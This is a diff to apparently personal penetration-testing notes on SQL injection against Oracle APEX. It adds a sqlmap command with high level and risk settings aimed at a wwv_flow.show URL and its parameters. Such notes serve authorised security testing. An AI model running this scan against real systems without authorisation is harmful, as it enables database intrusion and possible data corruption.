@@ -40,8 +40,10 @@ y = page ID
 
 ## Testing SQLi
 {% embed url="https://www.neooug.org/gloc/Presentations/2018/SpendoliniHacking%20Oracle%20APEX.pdf" %} Hacking Oracle APEX (pdf) {% endcontent-ref %}
+
 ## sqlmap
 ![image](https://github.com/buger-shack/scriptkiddie/assets/61053314/8cf0f7f6-2b5a-4f38-a2d3-e0421c885ce3)
+
 Rewrite with **wwv_flow.show** :
 ```bash
 sqlmap -u "https://app.oracle.com/ords/wwv_flow.show?p_flow_id=112&p_flow_step_id=5&p_instance=14720048029141&p_arg_name=RP,45&p_arg_value=F_DISPLAY" --batch --dbms Oracle --level 3 --risk 3
